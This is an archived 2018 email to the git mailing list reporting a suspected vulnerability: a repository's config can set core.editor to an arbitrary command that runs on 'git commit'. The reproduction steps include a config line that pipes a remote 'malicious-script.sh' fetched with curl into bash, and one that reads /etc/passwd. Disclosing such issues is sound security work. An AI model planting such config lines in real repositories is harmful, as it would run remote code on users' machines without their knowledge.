Return-Path: <git-owner@vger.kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.1 (2015-04-28) on dcvr.yhbt.net
X-Spam-Level: 
X-Spam-ASN: AS31976 209.132.180.0/23
X-Spam-Status: No, score=-4.0 required=3.0 tests=BAYES_00,DKIM_SIGNED,
	DKIM_VALID,DKIM_VALID_AU,FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,
	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI
	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.1
Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
	by dcvr.yhbt.net (Postfix) with ESMTP id B1A791F404
	for <e@80x24.org>; Sun, 26 Aug 2018 02:13:44 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1726415AbeHZFyf (ORCPT <rfc822;e@80x24.org>);
        Sun, 26 Aug 2018 01:54:35 -0400
Received: from mail-wm0-f48.google.com ([74.125.82.48]:40276 "EHLO
        mail-wm0-f48.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1726317AbeHZFyf (ORCPT <rfc822;git@vger.kernel.org>);
        Sun, 26 Aug 2018 01:54:35 -0400
Received: by mail-wm0-f48.google.com with SMTP id 207-v6so5008876wme.5
        for <git@vger.kernel.org>; Sat, 25 Aug 2018 19:13:42 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to
         :content-transfer-encoding;
        bh=WI+QeGT61UzZeuRX18xX+mE1ITNYCWpGDezJMPdXV18=;
        b=X8Ouws6XmkA6rAFK9KvrdHQeR9go9sE7uauWohi3jjvB2+2DNsLZbTf8CcFZ7B90HU
         Bk1dnaz0e6COOjJIf4943Pk1xGXsvAgREdXbPpCrR042LnZk1/xIRO4BLlRAW07aY+eQ
         rvKbgi+jLv/vRz/DPrS9JFHlmNIlNJhxmOGsS/bK/skZF7VPB+MQizQYNfTP22mvdhlV
         +ZF4UzEOZYAv8Y0kWZJAwMNjforFWQd7NwbEXOuD1kfQOq5VPBp+XBRVkNgnWVVZZYFO
         M6f+Owl3JJ/19PKgpPJ7Fn0Set0liQY6PYUOo5qpLC9JOoHC71Y6rlJktqK+3kObD9aJ
         f+hg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to
         :content-transfer-encoding;
        bh=WI+QeGT61UzZeuRX18xX+mE1ITNYCWpGDezJMPdXV18=;
        b=pGo9evkhvRhjfP0K8EtDLJukbgfmKAUjARMvJfJXqZ2ufHbNS2io64uCh52hMwJWqb
         98UpR/IBbC9EGFlKhIjzNLOULnrKSiYJJLYIVDUZ2i3P2wMrbOHeZO7Vzxd39/mr3Cjw
         fWAjEmmIEeEsK9e9Pm++cY0+33vM2IXRJajID/9vLyIBY1OquspEkgctnWSSrLgtqZbK
         JZlUDL+B8e5CI2y8hmeUmhEkEoo61L0FpvRPHHdsRhw05aYrVH6UyqhZFYLY090HJo5B
         u3uAjxieaFDKutgF6zyz1q45mbFDLaCbor917QTUlVs0sbpHAIWdfU2YfnWYl64K14GK
         umAQ==
X-Gm-Message-State: APzg51CGv/y9j1GRkJfeye7fulHTXBnkgOEueiO1a4eVD8dHRiPqKtk0
        MUItzZ8O0hfr99IzeJTqauSioODh+0xI5pnEy6jxGhs9
X-Google-Smtp-Source: ANB0VdYnqv7lDMqsQBHqu2DYqOHrUCUq9tcQSv/ptcbsg1Zh15ImzbIcB7n2W9yqvGkxSdEjGOMMBS/9w2PoVoozhus=
X-Received: by 2002:a1c:808b:: with SMTP id b133-v6mr2185996wmd.151.1535249621205;
 Sat, 25 Aug 2018 19:13:41 -0700 (PDT)
MIME-Version: 1.0
From:   "Leo Silva (a.k.a kirotawa)" <kirotawa@gmail.com>
Date:   Sat, 25 Aug 2018 23:13:30 -0300
Message-ID: <CA+KS1kb7yVoG-j7p83--2+0Ry+iFg1YbEa9KzxqPTvNZTF5RHQ@mail.gmail.com>
Subject: Git vulnerability - execution of arbitrary code through .git/conf
To:     git@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Sender: git-owner@vger.kernel.org
Precedence: bulk
List-ID: <git.vger.kernel.org>
X-Mailing-List: git@vger.kernel.org

Hi git community!

I found what seems to be a vulnerability/bug on git. I'm running
version 2.7.4 on Ubuntu xenial, but also tested with last version
2.19.0.rc0.2.g29d9e3e.

The steps to reproduce are:

1. open your .git/conf
2. add something like:
[core]
    editor =3D ls /etc/passwd
or even
    editor =3D curl -s http://server/path/malicious-script.sh | bash -s
3. run: git commit

A malicious user/repo can set some code through URL or even as command
in .git/conf and take control of your machine or silently run
malicious code.

[]'s
--=20

----------------------------------------------
Le=C3=B4nidas S. Barbosa (Kirotawa)
blog: corecode.wordpress.com
---------------------------------------------

"O que importa s=C3=A3o os incont=C3=A1veis pequenos atos de pessoas
desconhecidas, que fundam as bases para os eventos significativos que
se tornam hist=C3=B3ria" - Howard Zinn
